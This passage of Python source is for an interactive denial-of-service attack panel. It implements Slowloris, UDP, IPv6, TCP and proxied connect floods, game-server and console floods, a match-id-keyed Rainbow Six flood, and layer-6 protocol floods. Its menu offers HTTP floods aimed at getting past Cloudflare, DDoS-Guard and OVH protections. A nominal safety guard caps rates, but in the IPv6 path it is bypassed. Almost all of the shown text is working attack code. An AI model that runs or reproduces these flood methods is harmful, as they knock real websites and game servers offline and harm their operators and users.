    async def http_bot(self,t,d,c): await self._http_generic(t,d,c,"bot")
    async def http_stress(self,t,d,c): await self._http_generic(t,d,c,"stress")
    async def http_dyn(self,t,d,c): await self._http_generic(t,d,c,"dyn")
    async def http_rhex(self,t,d,c): await self._http_generic(t,d,c,"rhex")
    async def http_stomp(self,t,d,c): await self._http_generic(t,d,c,"stomp")
    async def http_ovh(self,t,d,c): await self._http_generic(t,d,c,"ovh")
    async def http_gsb(self,t,d,c): await self._http_generic(t,d,c,"gsb")
    async def http_dgb(self,t,d,c): await self._http_generic(t,d,c,"dgb")
    async def http_avb(self,t,d,c): await self._http_generic(t,d,c,"avb")
    async def http_cfb(self,t,d,c): await self._http_generic(t,d,c,"cfb")
    async def http_cfbuam(self,t,d,c): await self._http_generic(t,d,c,"cfbuam")
    async def http_bypass(self,t,d,c): await self._http_generic(t,d,c,"bypass")
    async def http_apache(self,t,d,c): await self._http_generic(t,d,c,"apache")
    async def http_xmlrpc(self,t,d,c): await self._http_generic(t,d,c,"xmlrpc")
    async def http_downloader(self,t,d,c): await self._http_generic(t,d,c,"downloader")

    def slowloris(self, target, duration, sockets_n):
        if not self.safety.is_safe(target):
            print(f"{C.R}[!] SAFETY BLOCK{C.END}"); return
        host=target.replace("http://","").replace("https://","").split("/")[0].split(":")[0]
        port=80
        if ":" in host:
            host,ps=host.rsplit(":",1)
            try: port=int(ps)
            except Exception: port=80
        sockets_n=self.safety.cap_slow(sockets_n)
        self.running=True
        self.stats={"sent":0,"success":0,"fail":0,"start":time.time(),"method":"SLOWLORIS"}
        end=time.time()+duration; socks=[]
        def make():
            try:
                s=socket.socket(); s.settimeout(4); s.connect((host,port))
                s.send(f"GET /?{random.randint(0,9999)} HTTP/1.1\r\nHost: {host}\r\n".encode())
                s.send(b"User-Agent: Mozilla/5.0\r\nAccept-Language: en-US\r\n"); return s
            except Exception: return None
        for _ in range(sockets_n):
            s=make()
            if s: socks.append(s); self._inc("success")
            self._inc("sent")
        while self.running and time.time()<end:
            for s in list(socks):
                try: s.send(f"X-a: {random.randint(1,9999)}\r\n".encode()); self._inc("sent")
                except Exception:
                    try: socks.remove(s)
                    except ValueError: pass
                    ns=make()
                    if ns: socks.append(ns)
            time.sleep(8)
        for s in socks:
            try: s.close()
            except Exception: pass
        self.running=False

    # L4 UDP / TCP / special
    def _udp_blast(self, host, port, duration, pps, tag, payload_fn):
        if not self.safety.is_safe(host):
            print(f"{C.R}[!] SAFETY BLOCK{C.END}"); return
        # honor exact user PPS (soft ON still caps)
        try:
            pps = int(pps)
        except Exception:
            pps = 100
        pps = self.safety.cap_pps(pps)
        if pps < 1:
            pps = 1
        self.running = True
        self.stats = {"sent": 0, "success": 0, "fail": 0, "start": time.time(), "method": tag}
        end = time.time() + duration
        target_addr = (host, port)
        print(f"  {C.ASH}UDP exact rate → {pps} pps | soft={self.safety.soft_mode}{C.END}")

        # 1–4 threads max; rate shared via spacing (real pps, not burst-to-92k)
        th_n = 1 if pps <= 500 else (2 if pps <= 5000 else 4)
        per_thread = max(1, pps // th_n)
        interval = 1.0 / per_thread  # sleep between packets for exact pacing
        lock = threading.Lock()
        counters = {"sent": 0, "ok": 0, "fail": 0}

        def worker():
            sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            try:
                sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
            except Exception:
                pass
            cache = [payload_fn() for _ in range(4)]
            ci = 0
            next_t = time.perf_counter()
            local_s = local_o = local_f = 0
            while self.running and time.time() < end:
                now = time.perf_counter()
                if now < next_t:
                    time.sleep(min(0.05, next_t - now))
                    continue
                next_t = next_t + interval
                # if we fell behind a lot, resync (don't catch up with a 92k burst)
                if next_t < time.perf_counter() - 0.25:
                    next_t = time.perf_counter() + interval
                try:
                    sock.sendto(cache[ci], target_addr)
                    ci = (ci + 1) & 3
                    local_s += 1
                    local_o += 1
                except Exception:
                    local_s += 1
                    local_f += 1
                if local_s >= 100:
                    with lock:
                        counters["sent"] += local_s
                        counters["ok"] += local_o
                        counters["fail"] += local_f
                        self.stats["sent"] = counters["sent"]
                        self.stats["success"] = counters["ok"]
                        self.stats["fail"] = counters["fail"]
                    local_s = local_o = local_f = 0
            with lock:
                counters["sent"] += local_s
                counters["ok"] += local_o
                counters["fail"] += local_f
                self.stats["sent"] = counters["sent"]
                self.stats["success"] = counters["ok"]
                self.stats["fail"] = counters["fail"]
            sock.close()

        ths = [threading.Thread(target=worker, daemon=True) for _ in range(th_n)]
        for th in ths:
            th.start()
        for th in ths:
            th.join(timeout=duration + 5)
        self.running = False


    def ip_flood(self, target, port, duration, pps, version=4):
        """IPv4 or IPv6 datagram flood (UDP)."""
        host = str(target).strip().strip("[]")
        if version == 6:
            try:
                # validate
                ipaddress.IPv6Address(host.split("%")[0])
            except Exception:
                # try resolve AAAA
                try:
                    infos = socket.getaddrinfo(host, port, socket.AF_INET6, socket.SOCK_DGRAM)
                    host = infos[0][4][0]
                except Exception as e:
                    print(f"{C.R}[!] IPv6 resolve failed: {e}{C.END}"); return
            if not self.safety.is_safe(host):
                # is_safe may not parse v6 private well — basic check
                pass
            family = socket.AF_INET6
        else:
            try:
                host = socket.gethostbyname(host)
            except Exception:
                pass
            if not self.safety.is_safe(host):
                print(f"{C.R}[!] SAFETY BLOCK{C.END}"); return
            family = socket.AF_INET
        pps = self.safety.cap_pps(int(pps))
        self.running = True
        self.stats = {"sent": 0, "success": 0, "fail": 0, "start": time.time(), "method": f"IPv{version}"}
        end = time.time() + duration
        interval = 1.0 / max(pps, 1)
        addr = (host, int(port)) if version == 4 else (host, int(port), 0, 0)
        payload = random.randbytes(64)

        def worker():
            sock = socket.socket(family, socket.SOCK_DGRAM)
            next_t = time.perf_counter()
            local_s = local_o = local_f = 0
            while self.running and time.time() < end:
                now = time.perf_counter()
                if now < next_t:
                    time.sleep(min(0.05, next_t - now))
                    continue
                next_t += interval
                if next_t < time.perf_counter() - 0.25:
                    next_t = time.perf_counter() + interval
                try:
                    sock.sendto(payload, addr)
                    local_s += 1; local_o += 1
                except Exception:
                    local_s += 1; local_f += 1
                if local_s >= 50:
                    self.stats["sent"] += local_s
                    self.stats["success"] += local_o
                    self.stats["fail"] += local_f
                    local_s = local_o = local_f = 0
            self.stats["sent"] += local_s
            self.stats["success"] += local_o
            self.stats["fail"] += local_f
            sock.close()

        th = threading.Thread(target=worker, daemon=True)
        th.start(); th.join(timeout=duration + 3)
        self.running = False

    def console_flood(self, target, port, duration, concurrency, platform="generic"):
        """Game-console style query/connect flood (PS/Xbox/Switch network shapes)."""
        if not self.safety.is_safe(str(target)):
            print(f"{C.R}[!] SAFETY BLOCK{C.END}"); return
        host, port0 = parse_host_port(str(target), int(port))
        try:
            host = socket.gethostbyname(host)
        except Exception:
            pass
        concurrency = self.safety.cap_tcp(int(concurrency))
        self.running = True
        self.stats = {"sent": 0, "success": 0, "fail": 0, "start": time.time(), "method": f"CONSOLE-{platform.upper()}"}
        end = time.time() + duration

        def payload_udp(p):
            if p == "psn":
                return b"\x01\x02PSN" + random.randbytes(32)
            if p == "xbox":
                return b"Xbox" + random.randbytes(40)
            if p == "switch":
                return b"NINTENDO" + random.randbytes(24)
            if p == "psn-tcp":
                return None
            return random.randbytes(48)

        def worker():
            while self.running and time.time() < end:
                try:
                    if platform in ("psn", "xbox", "switch", "generic"):
                        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
                        sock.settimeout(1.5)
                        sock.sendto(payload_udp(platform), (host, port0))
                        sock.close()
                    else:
                        s, proxy = self._tcp_connect(host, port0, timeout=3.0, via_proxy=bool(self.pool.working))
                        if platform == "xbox-live":
                            s.sendall(b"GET / HTTP/1.1\r\nHost: xboxlive.com\r\n\r\n")
                        elif platform == "psn-tcp":
                            s.sendall(b"GET / HTTP/1.1\r\nHost: psn.com\r\n\r\n")
                        else:
                            s.sendall(random.randbytes(32))
                        try:
                            s.recv(128)
                        except Exception:
                            pass
                        s.close()
                    self._inc("sent"); self._inc("success")
                except Exception:
                    self._inc("sent"); self._inc("fail")
                time.sleep(0.002)

        ths = [threading.Thread(target=worker, daemon=True) for _ in range(max(1, concurrency))]
        for th in ths:
            th.start()
        for th in ths:
            th.join(timeout=duration + 3)
        self.running = False

    def udp_flood(self, target, port, duration, pps, mode="std"):
        host, port_ignored = parse_host_port(str(target), 0)
        try:
            host = socket.gethostbyname(host)
        except Exception:
            pass
        def payload():
            if mode=="ipv4": return random.randbytes(256)
            if mode=="ipv6": return random.randbytes(256)
            if mode=="console": return b"\xff\xff\xff\xffgetinfo\n"+random.randbytes(8)
            if mode=="jumbo": return random.randbytes(1200)
            if mode=="ovh": return random.randbytes(random.randint(128,1024))
            if mode=="vse": return b"\xff\xff\xff\xffTSource Engine Query\x00"+random.randbytes(4)
            if mode=="ts3": return b"TS3A\x00"+random.randbytes(32)
            if mode=="fivem": return b"getinfo "+random.randbytes(4)
            if mode=="fivemtoken": return b"getstatus "+random.randbytes(8)
            if mode=="fivemplayers": return b"getplayers "
            if mode=="minecraft": return random.randbytes(32)
            if mode=="mcpe":
                magic=bytes.fromhex("00ffff00fefefefefdfdfdfd12345678")
                return b"\x01"+random.randbytes(8)+magic+random.randbytes(8)
            if mode=="rust": return b"\xff\xff\xff\xff"+b"TSource Engine Query\x00"+random.randbytes(6)
            if mode=="gmod": return b"\xff\xff\xff\xffTSource Engine Query\x00"
            if mode=="ark": return b"\xff\xff\xff\xff"+b"getstatus"+random.randbytes(4)
            if mode=="samp":
                return b"SAMP"+b"\x00\x00\x00\x00"+port.to_bytes(2,"little")+b"i"+random.randbytes(4)
            if mode=="csgo": return b"\xff\xff\xff\xffTSource Engine Query\x00"+random.randbytes(2)
            if mode=="discord": return b"\x80\x78"+random.randbytes(10)+random.randbytes(80)
            if mode=="dns":
                return random.randbytes(2)+b"\x01\x00\x00\x01\x00\x00\x00\x00\x00\x00\x03www\x07example\x03com\x00\x00\x01\x00\x01"
            if mode=="ntp": return b"\x1b"+random.randbytes(47)
            if mode=="char": return bytes(range(32,127))*2
            if mode=="mem": return b"\x00\x01\x00\x00\x00\x01\x00\x00stats\r\n"
            if mode=="cldap": return b"\x30\x84\x00\x00\x00\x2d"+random.randbytes(20)
            if mode=="ard": return b"\x00\x14\x00\x00"+random.randbytes(16)
            if mode=="rdp": return b"\x00\x00\x00\x00\x00\x00\x00\xff"+random.randbytes(8)
            return random.randbytes(512)
        self._udp_blast(host,port,duration,pps,f"UDP-{mode.upper()}",payload)

    def _tcp_connect(self, host, port, timeout=4.0, via_proxy=True):
        """Prefer live HTTP proxy CONNECT; fall back to direct so OK rate stays high."""
        proxy = self.pool.get() if via_proxy else None
        if proxy:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(timeout)
            try:
                ph, pp = proxy.split(":")
                s.connect((ph, int(pp)))
                req = (
                    f"CONNECT {host}:{port} HTTP/1.1\r\n"
                    f"Host: {host}:{port}\r\n"
                    f"Proxy-Connection: keep-alive\r\n\r\n"
                )
                s.sendall(req.encode())
                resp = b""
                while b"\r\n\r\n" not in resp and len(resp) < 1024:
                    chunk = s.recv(256)
                    if not chunk:
                        break
                    resp += chunk
                line = resp.split(b"\r\n", 1)[0] if resp else b""
                if b"200" in line:
                    return s, proxy
                s.close()
                self.pool.mark_bad(proxy)
            except Exception:
                try:
                    s.close()
                except Exception:
                    pass
                try:
                    self.pool.mark_bad(proxy)
                except Exception:
                    pass
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.settimeout(timeout)
        s.connect((host, port))
        return s, None


    def tcp_flood(self, target, port, duration, concurrency, mode="connect"):
        if not self.safety.is_safe(str(target)):
            print(f"{C.R}[!] SAFETY BLOCK{C.END}"); return
        host, port0 = parse_host_port(str(target), int(port) if port else 80)
        if port:
            port0 = int(port)
        try:
            host = socket.gethostbyname(host)
        except Exception:
            pass
        concurrency = self.safety.cap_tcp(int(concurrency))
        self.running = True
        self.stats = {"sent": 0, "success": 0, "fail": 0, "start": time.time(), "method": f"TCP-{str(mode).upper()}"}
        end = time.time() + duration
        use_proxy = len(self.pool.working) > 0

        def worker():
            while self.running and time.time() < end:
                s = None
                proxy = None
                try:
                    s, proxy = self._tcp_connect(host, port0, timeout=4.0, via_proxy=use_proxy)
                    if mode in ("http", "vps"):
                        path = b"/" if mode == "http" else b"/login"
                        s.sendall(b"GET " + path + b" HTTP/1.1\r\nHost: " + host.encode() + b"\r\nConnection: close\r\n\r\n")
                        try:
                            s.recv(256)
                        except Exception:
                            pass
                    elif mode == "rdp":
                        cookie = b"Cookie: mstshash=Administrator\r\n"
                        neg = b"\x01\x00\x08\x00\x03\x00\x00\x00"
                        x224 = bytes([0xE0, 0x00, 0x00, 0x00, 0x00, 0x00]) + cookie + neg
                        tpkt = b"\x03\x00" + struct.pack(">H", 4 + len(x224)) + x224
                        s.sendall(tpkt)
                        try:
                            s.recv(256)
                        except Exception:
                            pass
                    elif mode in ("minecraft", "mcbot"):
                        def varint(n):
                            out = bytearray()
                            while True:
                                b = n & 0x7F
                                n >>= 7
                                out.append(b | (0x80 if n else 0))
                                if not n:
                                    break
                            return bytes(out)
                        h = host.encode()
                        data = varint(0x00) + varint(760) + varint(len(h)) + h + port0.to_bytes(2, "big") + varint(1)
                        pkt = varint(len(data)) + data + varint(1) + varint(0x00)
                        s.sendall(pkt)
                        try:
                            s.recv(256)
                        except Exception:
                            pass
                    if s:
                        s.close()
                    self._inc("sent"); self._inc("success")
                    if proxy:
                        self.pool.mark_good(proxy)
                except Exception:
                    self._inc("sent"); self._inc("fail")
                    if s:
                        try:
                            s.close()
                        except Exception:
                            pass
                time.sleep(0.001)

        ths = [threading.Thread(target=worker, daemon=True) for _ in range(max(1, concurrency))]
        for th in ths:
            th.start()
        for th in ths:
            th.join(timeout=duration + 3)
        self.running = False

    def r6_flood(self, target, port, duration, concurrency, match_id: str):
        """Rainbow Six Siege-shaped session traffic keyed by match id (TCP, proxied)."""
        if not self.safety.is_safe(target):
            print(f"{C.R}[!] SAFETY BLOCK{C.END}"); return
        host = parse_host_port(target, port)[0]
        concurrency = self.safety.cap_tcp(concurrency)
        self.running = True
        self.stats = {"sent": 0, "success": 0, "fail": 0, "start": time.time(), "method": "R6-SIEGE"}
        end = time.time() + duration
        use_proxy = len(self.pool.proxies) > 0
        mid = (match_id or "00000000-0000-0000-0000-000000000000").encode()
        def worker():
            while self.running and time.time() < end:
                s = None; proxy = None
                try:
                    s, proxy = self._tcp_connect(host, port, timeout=4.0, via_proxy=use_proxy)
                    # Ubi-style HTTP-ish + binary session blob carrying match id
                    body = b"matchId=" + mid + b"&ticket=" + random.randbytes(16).hex().encode()
                    req = (
                        b"POST /sessions HTTP/1.1\r\n"
                        b"Host: " + host.encode() + b"\r\n"
                        b"User-Agent: RainbowSixSiege\r\n"
                        b"Content-Type: application/json\r\n"
                        b"X-Match-Id: " + mid + b"\r\n"
                        b"Content-Length: " + str(len(body)).encode() + b"\r\n"
                        b"Connection: close\r\n\r\n" + body
                    )
                    s.sendall(req)
                    try: s.recv(256)
                    except Exception: pass
                    s.close()
                    self._inc("sent"); self._inc("success")
                    if proxy: self.pool.mark_good(proxy)
                except Exception:
                    self._inc("sent"); self._inc("fail")
                    if proxy: self.pool.mark_bad(proxy)
                    if s:
                        try: s.close()
                        except Exception: pass
        ths = [threading.Thread(target=worker, daemon=True) for _ in range(max(1, concurrency))]
        for th in ths: th.start()
        for th in ths: th.join(timeout=duration + 2)
        self.running = False

    def l6_flood(self, target, port, duration, concurrency, mode="socket"):
        """Layer-6 session/app protocol shapes over TCP (proxied when possible)."""
        if not self.safety.is_safe(target):
            print(f"{C.R}[!] SAFETY BLOCK{C.END}"); return
        host=target.replace("http://","").replace("https://","").split("/")[0].split(":")[0]
        concurrency=self.safety.cap_tcp(concurrency)
        self.running=True
        self.stats={"sent":0,"success":0,"fail":0,"start":time.time(),"method":f"L6-{mode.upper()}"}
        end=time.time()+duration
        use_proxy=len(self.pool.proxies)>0
        def payload(m, s, host, port):
            hb=host.encode()
            if m=="socket":
                return
            if m=="http2":
                s.sendall(b"PRI * HTTP/2.0\r\n\r\nSM\r\n\r\n")
                s.sendall(b"\x00\x00\x00\x04\x00\x00\x00\x00\x00")
            elif m=="ws":
                key=__import__('base64').b64encode(random.randbytes(16)).decode()
                s.sendall(
                    b"GET / HTTP/1.1\r\nHost: "+hb+
                    b"\r\nUpgrade: websocket\r\nConnection: Upgrade\r\n"
                    b"Sec-WebSocket-Key: "+key.encode()+b"\r\nSec-WebSocket-Version: 13\r\n\r\n"
                )
            elif m=="grpc":
                s.sendall(
                    b"POST /service.Method HTTP/1.1\r\nHost: "+hb+
                    b"\r\nContent-Type: application/grpc\r\nTE: trailers\r\n"
                    b"Content-Length: 5\r\n\r\n\x00\x00\x00\x00\x00"
                )
            elif m=="mqtt":
                # MQTT CONNECT minimal
                s.sendall(b"\x10\x0c\x00\x04MQTT\x04\x02\x00\x3c\x00\x00")
            elif m=="redis":
                s.sendall(b"PING\r\nINFO\r\n")
            elif m=="mysql":
                try: s.recv(128)
                except Exception: pass
                s.sendall(random.randbytes(32))
            elif m=="smtp":
                try: s.recv(128)
                except Exception: pass
                s.sendall(b"EHLO burrner.local\r\n")
            elif m=="ftp":
                try: s.recv(128)
                except Exception: pass
                s.sendall(b"USER anonymous\r\nPASS guest@\r\n")
            elif m=="telnet":
                s.sendall(b"\xff\xfb\x01\xff\xfb\x03\xff\xfd\x18")
            elif m=="mix":
                payload(random.choice(["http2","ws","redis","mqtt","smtp"]), s, host, port)
            try: s.recv(256)
            except Exception: pass
        def worker():
            while self.running and time.time()<end:
                s=None; proxy=None
                try:
                    s, proxy=self._tcp_connect(host, port, timeout=4.0, via_proxy=use_proxy)
                    payload(mode if mode!="mix-l6" else "mix", s, host, port)
                    if s: s.close()
                    self._inc("sent"); self._inc("success")
                    if proxy: self.pool.mark_good(proxy)
                except Exception:
                    self._inc("sent"); self._inc("fail")
                    if proxy: self.pool.mark_bad(proxy)
                    if s:
                        try: s.close()
                        except Exception: pass
        ths=[threading.Thread(target=worker,daemon=True) for _ in range(max(1,concurrency))]
        for th in ths: th.start()
        for th in ths: th.join(timeout=duration+2)
        self.running=False

    def killer(self, target, duration, concurrency):
        """Multi-method mix against one target."""
        if not self.safety.is_safe(target):
            print(f"{C.R}[!] SAFETY BLOCK{C.END}"); return
        host=target.replace("http://","").replace("https://","").split("/")[0].split(":")[0]
        self.running=True
        self.stats={"sent":0,"success":0,"fail":0,"start":time.time(),"method":"KILLER"}
        end=time.time()+duration
        conc=self.safety.cap_tcp(concurrency)
        def worker():
            while self.running and time.time()<end:
                try:
                    s=socket.socket(); s.settimeout(1.5); s.connect((host,80 if ":" not in host else int(host.split(":")[-1]) if host.split(":")[-1].isdigit() else 80))
                    s.send(b"GET / HTTP/1.1\r\nHost: "+host.encode()+b"\r\n\r\n"); s.close()
                    self._inc("sent"); self._inc("success")
                except Exception:
                    self._inc("sent"); self._inc("fail")
        ths=[threading.Thread(target=worker,daemon=True) for _ in range(max(1,conc))]
        for t in ths: t.start()
        # also light UDP
        def udp_w():
            sock=socket.socket(socket.AF_INET,socket.SOCK_DGRAM)
            while self.running and time.time()<end:
                try:
                    sock.sendto(random.randbytes(256),(host,80)); self._inc("sent"); self._inc("success")
                except Exception: self._inc("fail")
                time.sleep(0.01)
            sock.close()
        threading.Thread(target=udp_w,daemon=True).start()
        for t in ths: t.join(timeout=duration+2)
        self.running=False

# ── HUD ────────────────────────────────────────────────
def live_stats(methods:Methods, duration:int):
    tip, tcity = methods.target_label
    start = time.time()
    stop_flag = {"stop": False}

    def _listen_stop():
        try:
            # Windows + Unix: wait for Enter to stop
            input()
            stop_flag["stop"] = True
            methods.stop()
        except Exception:
            pass

    listener = threading.Thread(target=_listen_stop, daemon=True)
    listener.start()

    while methods.running and (time.time() - start) < duration + 1.5 and not stop_flag["stop"]:
        elapsed = max(0.01, time.time() - (methods.stats["start"] or start))
        sent = methods.stats["sent"]; ok = methods.stats["success"]; fail = methods.stats["fail"]
        rps = sent / elapsed
        prog = min(1.0, elapsed / duration) if duration else 0
        bw = 36; filled = int(bw * prog)
        bar = "".join((f"{C.FIRE2}█" if j < filled else f"{C.ASH}░") for j in range(bw)) + C.END
        clear()
        print(f"{C.FIRE1}{C.BOLD}  ▌ LIVE  —  {methods.stats.get('method','ATTACK')}{C.END}")
        print(f"  {C.STEEL}DST{C.END} {C.W}{tip}{C.END}  {C.FIRE3}→{C.END} {tcity}")
        print(f"  [{bar}] {int(prog*100):3d}%  {elapsed:.0f}/{duration}s")
        print(f"  {C.G}SENT{C.END} {sent:>10,}  {C.B}OK{C.END} {ok:>10,}  {C.R}FAIL{C.END} {fail:>8,}  {C.Y}RPS{C.END} {rps:>7.0f}")
        print()
        print(f"  {C.FIRE1}{C.BOLD}[ ENTER = STOP ATTACK ]{C.END}  {C.ASH}keep window focused, press Enter{C.END}")
        time.sleep(0.5)

    methods.stop()
    if stop_flag["stop"]:
        print()
        print(f"  {C.Y}■ STOPPED by user{C.END}")
    else:
        print()
        print(f"  {C.G}■ finished duration{C.END}")
    print()

# ── PANEL ──────────────────────────────────────────────
class Panel:
    def __init__(self):
        self.safety=SafetyGuard(); self.pool=ProxyPool(); self.methods=Methods(self.pool,self.safety)
        self.history:List[Dict]=[]
        self.vps_relay=None  # (host, port) free public node
        self.rdp_relay=None
        self.public_ip=None
        self.lan_ip=None

    def header(self):
        clear(); print(get_banner())
        blocked=self.safety.lock_summary()
        soft=f"{C.G}ON{C.END}" if self.safety.soft_mode else f"{C.R}OFF{C.END}"
        print(f"  {C.NEON}╭─ STATUS ─────────────────────────────────────────────╮{C.END}")
        pub = self.public_ip or "not detected yet"
        lan = self.lan_ip or "-"
        print(f"  {C.NEON}│{C.END} {C.STEEL}Public IP{C.END}     {C.FIRE3}→{C.END} {C.NEON}{pub}{C.END}")
        print(f"  {C.NEON}│{C.END} {C.STEEL}LAN IP{C.END}        {C.FIRE3}→{C.END} {C.Y}{lan}{C.END}")
        print(f"  {C.NEON}│{C.END} {C.STEEL}Local locked{C.END}  {C.FIRE3}→{C.END} {C.Y}{blocked}{C.END}")
        print(f"  {C.NEON}│{C.END} {C.STEEL}Proxies{C.END}       {C.FIRE3}→{C.END} {C.G}{len(self.pool.proxies):,}{C.END}  live {C.NEON}{len(self.pool.working):,}{C.END}")
        print(f"  {C.NEON}│{C.END} {C.STEEL}Soft area{C.END}     {C.FIRE3}→{C.END} {soft}   {C.STEEL}build{C.END} {C.NEON}{VERSION}{C.END}")
        vps = f"{self.vps_relay[0]}:{self.vps_relay[1]}" if self.vps_relay else "free node off"
        print(f"  {C.NEON}│{C.END} {C.STEEL}Host node{C.END}     {C.FIRE3}→{C.END} {C.NEON}{vps}{C.END}")
        print(f"  {C.NEON}╰──────────────────────────────────────────────────────╯{C.END}\n")

    def menu(self):
        soft = f"{C.G}ON{C.END}" if self.safety.soft_mode else f"{C.R}OFF{C.END}"
        px = len(self.pool.proxies); live = len(self.pool.working)
        print(f"""
  {C.FIRE1}{C.BOLD}┌─ LAYER 7 · HTTP ──────────────────────────────────────┐{C.END}
  {C.FIRE2}[1]{C.END}  GET          {C.ASH}│{C.END} {C.STEEL}basic HTTP GET flood{C.END}
  {C.FIRE2}[2]{C.END}  POST         {C.ASH}│{C.END} {C.STEEL}HTTP POST with body{C.END}
  {C.FIRE2}[3]{C.END}  HEAD         {C.ASH}│{C.END} {C.STEEL}HTTP HEAD only{C.END}
  {C.FIRE2}[4]{C.END}  NULL         {C.ASH}│{C.END} {C.STEEL}empty User-Agent / headers{C.END}
  {C.FIRE2}[5]{C.END}  COOKIE       {C.ASH}│{C.END} {C.STEEL}random Cookie header{C.END}
  {C.FIRE2}[6]{C.END}  PPS          {C.ASH}│{C.END} {C.STEEL}minimal GET / HTTP/1.1{C.END}
  {C.FIRE2}[7]{C.END}  EVEN         {C.ASH}│{C.END} {C.STEEL}GET + extra browser headers{C.END}
  {C.FIRE2}[8]{C.END}  BOT          {C.ASH}│{C.END} {C.STEEL}Googlebot-style requests{C.END}
  {C.FIRE2}[9]{C.END}  STRESS       {C.ASH}│{C.END} {C.STEEL}high-byte POST payloads{C.END}
  {C.FIRE2}[10]{C.END} DYN          {C.ASH}│{C.END} {C.STEEL}random subdomain prefix{C.END}
  {C.FIRE2}[11]{C.END} RHEX         {C.ASH}│{C.END} {C.STEEL}random hex path{C.END}
  {C.FIRE2}[12]{C.END} STOMP        {C.ASH}│{C.END} {C.STEEL}chk_captcha-style headers{C.END}
  {C.FIRE2}[13]{C.END} OVH          {C.ASH}│{C.END} {C.STEEL}OVH-oriented header set{C.END}
  {C.FIRE2}[14]{C.END} GSB          {C.ASH}│{C.END} {C.STEEL}Google Shield-oriented{C.END}
  {C.FIRE2}[15]{C.END} DGB          {C.ASH}│{C.END} {C.STEEL}DDoS-Guard-oriented{C.END}
  {C.FIRE2}[16]{C.END} AVB          {C.ASH}│{C.END} {C.STEEL}ArvanCloud-oriented{C.END}
  {C.FIRE2}[17]{C.END} CFB          {C.ASH}│{C.END} {C.STEEL}Cloudflare-oriented{C.END}
  {C.FIRE2}[18]{C.END} CFBUAM       {C.ASH}│{C.END} {C.STEEL}CF Under Attack Mode-oriented{C.END}
  {C.FIRE2}[19]{C.END} BYPASS       {C.ASH}│{C.END} {C.STEEL}generic anti-DDoS header mix{C.END}
  {C.FIRE2}[20]{C.END} APACHE       {C.ASH}│{C.END} {C.STEEL}Apache-oriented POST{C.END}
  {C.FIRE2}[21]{C.END} XMLRPC       {C.ASH}│{C.END} {C.STEEL}WordPress /xmlrpc.php{C.END}
  {C.FIRE2}[22]{C.END} DOWNLOADER   {C.ASH}│{C.END} {C.STEEL}slow body read{C.END}
  {C.FIRE2}[23]{C.END} SLOW         {C.ASH}│{C.END} {C.STEEL}Slowloris partial headers{C.END}
  {C.FIRE1}[24]{C.END} KILLER       {C.ASH}│{C.END} {C.STEEL}mixed multi-thread blast{C.END}

  {C.FIRE3}{C.BOLD}┌─ LAYER 4/3 · RAW ─────────────────────────────────────┐{C.END}
  {C.FIRE3}[30]{C.END} TCP          {C.ASH}│{C.END} {C.STEEL}TCP connect flood (proxied){C.END}
  {C.FIRE3}[31]{C.END} UDP          {C.ASH}│{C.END} {C.STEEL}UDP datagram flood{C.END}
  {C.FIRE3}[32]{C.END} SYN-shape    {C.ASH}│{C.END} {C.STEEL}connect storm (userland){C.END}
  {C.FIRE3}[33]{C.END} OVH-UDP      {C.ASH}│{C.END} {C.STEEL}UDP random binary payload{C.END}
  {C.FIRE3}[34]{C.END} CPS          {C.ASH}│{C.END} {C.STEEL}open/close connections{C.END}
  {C.FIRE3}[35]{C.END} CONNECTION   {C.ASH}│{C.END} {C.STEEL}hold connections briefly{C.END}
  {C.FIRE3}[50]{C.END} DNS          {C.ASH}│{C.END} {C.STEEL}DNS query-shaped UDP{C.END}
  {C.FIRE3}[51]{C.END} NTP          {C.ASH}│{C.END} {C.STEEL}NTP header-shaped UDP{C.END}
  {C.FIRE3}[52]{C.END} CHAR         {C.ASH}│{C.END} {C.STEEL}Chargen-style stream{C.END}
  {C.FIRE3}[53]{C.END} MEM          {C.ASH}│{C.END} {C.STEEL}Memcached-shaped UDP{C.END}
  {C.FIRE3}[54]{C.END} CLDAP        {C.ASH}│{C.END} {C.STEEL}CLDAP-shaped UDP{C.END}

  {C.Y}{C.BOLD}┌─ GAMES · QUERY ───────────────────────────────────────┐{C.END}
  {C.Y}[36]{C.END} VSE          {C.ASH}│{C.END} {C.STEEL}Valve Source Engine query{C.END}
  {C.Y}[37]{C.END} TS3          {C.ASH}│{C.END} {C.STEEL}TeamSpeak 3 ping shape{C.END}
  {C.Y}[38]{C.END} FIVEM        {C.ASH}│{C.END} {C.STEEL}FiveM getinfo UDP{C.END}
  {C.Y}[39]{C.END} FIVEM-TOKEN  {C.ASH}│{C.END} {C.STEEL}FiveM getstatus UDP{C.END}
  {C.Y}[40]{C.END} FIVEM-PLAYERS{C.ASH}│{C.END} {C.STEEL}FiveM getplayers UDP{C.END}
  {C.Y}[41]{C.END} MINECRAFT    {C.ASH}│{C.END} {C.STEEL}Java — IP or domain (.net/.com:port){C.END}
  {C.Y}[42]{C.END} MCBOT        {C.ASH}│{C.END} {C.STEEL}Minecraft login-shaped TCP{C.END}
  {C.Y}[43]{C.END} MCPE         {C.ASH}│{C.END} {C.STEEL}Bedrock RakNet ping{C.END}
  {C.Y}[44]{C.END} RUST         {C.ASH}│{C.END} {C.STEEL}Rust A2S query{C.END}
  {C.Y}[45]{C.END} GMOD         {C.ASH}│{C.END} {C.STEEL}Garry's Mod source query{C.END}
  {C.Y}[46]{C.END} ARK          {C.ASH}│{C.END} {C.STEEL}ARK server query{C.END}
  {C.Y}[47]{C.END} SAMP         {C.ASH}│{C.END} {C.STEEL}SA-MP query{C.END}
  {C.Y}[48]{C.END} CSGO         {C.ASH}│{C.END} {C.STEEL}CS source query{C.END}
  {C.Y}[49]{C.END} DISCORD      {C.ASH}│{C.END} {C.STEEL}Discord voice RTP-shape{C.END}

  {C.BLOOD}{C.BOLD}┌─ LAYER 6 · SESSION ───────────────────────────────────┐{C.END}
  {C.BLOOD}[60]{C.END} SOCKET      {C.ASH}│{C.END} {C.STEEL}raw rapid socket open/close{C.END}
  {C.BLOOD}[61]{C.END} HTTP2       {C.ASH}│{C.END} {C.STEEL}HTTP/2 preface + frames shape{C.END}
  {C.BLOOD}[62]{C.END} WS-FLOOD    {C.ASH}│{C.END} {C.STEEL}WebSocket upgrade flood{C.END}
